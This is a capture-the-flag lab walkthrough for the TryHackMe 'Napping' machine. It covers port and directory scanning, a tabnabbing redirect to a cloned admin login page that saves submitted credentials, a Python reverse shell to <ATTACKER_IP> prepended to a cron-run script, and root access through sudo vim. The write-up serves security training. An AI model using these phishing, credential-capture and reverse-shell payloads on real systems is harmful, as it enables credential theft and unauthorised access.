# [Napping](https://tryhackme.com/room/nappingis1337)

## Even Admins can fall asleep on the job

# Napping Flags

## To hack into this machine, you must look at the source and focus on the target.

### What is the user flag?

1. Start with an `nmap` scan to identify open ports and running services on the target.

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Enumerate directories and files on the web server using Gobuster to discover hidden endpoints.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50
```

**Results:**

```
/register.php         (Status: 200) [Size: 1567]
/index.php            (Status: 200) [Size: 1211]
/admin                (Status: 301) [Size: 316] [--> http://<TARGET_IP>/admin/]
/welcome.php          (Status: 302) [Size: 0] [--> index.php]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 1]
/server-status        (Status: 403) [Size: 279]
```

3. Enumerate the `/admin` directory further to map available admin-area endpoints.

```bash
gobuster dir -u http://<TARGET_IP>/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50
```

**Results:**

```
/login.php            (Status: 200) [Size: 1158]
/welcome.php          (Status: 302) [Size: 0] [--> login.php]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
```

4. Register a new account at `http://<TARGET_IP>/register.php` and log in. After logging in, visit `http://<TARGET_IP>/welcome.php`. The page contains a form that invites users to submit a URL for the admin to review.

5. On the attacker machine, create a working directory with the following structure, then start a PHP development server to host our malicious files:

```
./
├── index.php
└── admin/
    └── login.php
```

```bash
php -S 0.0.0.0:8000
```

6. Create `index.php`. This is the landing page the admin opens in a new tab after clicking our submitted link. The script immediately redirects the parent window to our fake admin login page using `window.opener`. The new tab can be left blank - it exists only to execute the redirect.

```php
<html>
  <body>
    <script>
      if (window.opener) {
        window.opener.location = "http://<ATTACKER_IP>:8000/login.php";
      }
    </script>
  </body>
</html>
```

7. Create `admin/login.php` by copying the source of `http://<TARGET_IP>/admin/login.php` and adding a PHP snippet at the top that writes the POST body to `creds.txt` whenever a username is submitted. When the admin's original tab is redirected here and they re-enter their credentials, the credentials are captured on our machine.

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<?php if (isset($_POST['username'])){file_put_contents('creds.txt', file_get_contents('php://input'));} ?>
<body>
    <div class="wrapper">
        <h2>Admin Login</h2>
        <p>Please fill in your credentials to login.</p>


        <form action="/admin/login.php" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control " value="">
                <span class="invalid-feedback"></span>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control ">
                <span class="invalid-feedback"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <br>
        </form>
    </div>
</body>
</html>
```

8. Submit `http://<ATTACKER_IP>:8000` as the URL in the form at `http://<TARGET_IP>/welcome.php`. A server-side process periodically reviews submitted links as the admin. Once the admin user clicks the link: a new tab opens with our `index.php`, which immediately redirects their original tab to our fake `admin/login.php`. The admin, now seeing what appears to be the admin login page, re-enters their credentials - sending them directly to our PHP server.

9. Once the admin has submitted credentials, `creds.txt` will be written to the server's working directory. Read it to retrieve the captured data.

```bash
cat creds.txt
```

**Results:**

```
username=daniel&password=C%40ughtm3napping123
```

10. Use the captured credentials to authenticate via SSH.

```bash
ssh daniel@<TARGET_IP>
# Password: C@ughtm3napping123
```

11. After logging in as `daniel`, explore other user home directories. Inspect the `adrian` user script to understand what it does.

```bash
cat /home/adrian/query.py
```

**Results:**

```py
from datetime import datetime
import requests

now = datetime.now()

r = requests.get('http://127.0.0.1/')
if r.status_code == 200:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Site is Up: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
else:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Check Out Site: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
```

> The script periodically checks whether the local web server is up and logs the result to `site_status.txt`. Since this runs as a cron job under `adrian`, injecting a reverse shell payload will give us a shell as `adrian`.

12. Before modifying the script, set up a Netcat listener on the attacker machine to catch the incoming reverse shell connection.

```bash
nc -lvnp 4444
```

13. Prepend a reverse shell payload to `/home/adrian/query.py`. When the cron job next executes the script as `adrian`, it will connect back to the listener before the rest of the script runs.

```py
from datetime import datetime
import requests
import socket,os,pty

RHOST = "<ATTACKER_IP>"
RPORT = 4444

s = socket.socket()
s.connect((RHOST, RPORT))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn("/bin/sh")

now = datetime.now()

r = requests.get('http://127.0.0.1/')
if r.status_code == 200:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Site is Up: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
else:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Check Out Site: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
```

14. Wait up to a minute for the cron job to fire. A shell as `adrian` will appear on the Netcat listener. Read the user flag.

```bash
cat /home/adrian/user.txt
```

[SCREEN01]

---

### What is the root flag?

1. The reverse shell is a basic, unstable TTY. Upgrade it to a fully interactive shell to enable job control and clear terminal output.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo;fg;
```

2. Check what commands `adrian` is permitted to run with elevated privileges.

```bash
sudo -l
```

**Results:**

```
Matching Defaults entries for adrian on ip:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on ip:
    (root) NOPASSWD: /usr/bin/vim
```

> `adrian` can run `vim` as `root` without a password. This is a well-known GTFOBins privilege escalation vector. Vim supports executing arbitrary shell commands from within the editor.

3. Exploit Vim's built-in command execution to spawn a root shell. The `-c` flag runs a Vim command immediately on startup; `:!/bin/sh` executes `sh` as the process owner.

```bash
sudo /usr/bin/vim -c ':!/bin/sh'
```

4. A root shell is now active. Read the root flag.

```bash
cat /root/root.txt
```

[SCREEN02]
